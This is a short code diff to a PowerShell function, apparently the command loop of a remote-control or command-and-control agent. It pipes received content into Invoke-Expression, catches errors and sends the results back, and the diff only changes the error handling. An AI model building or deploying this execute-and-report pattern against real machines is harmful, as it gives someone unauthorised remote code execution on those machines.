@@ -139,14 +139,15 @@ function console{
 
                 if($content.length -gt 0)
                 { 
-                    try {
-                        $results = $content | iex
-                    } catch {
-                        $results = $_.Exception.Message
+                    $Error.clear()
+                    $results = $content | iex
+                    if ($Error) {
+                        $results = $Error.GetRange(0,1)
                     }
-
+           
+                    if (-not $results) {$results = "Completed"}
                     #Send results
-                    if ($results -and ($results.GetType().Name -ne "String"))
+                    if ($results.GetType().Name -ne "String")
                     {
                         $send = ""
                         foreach($i in $results)
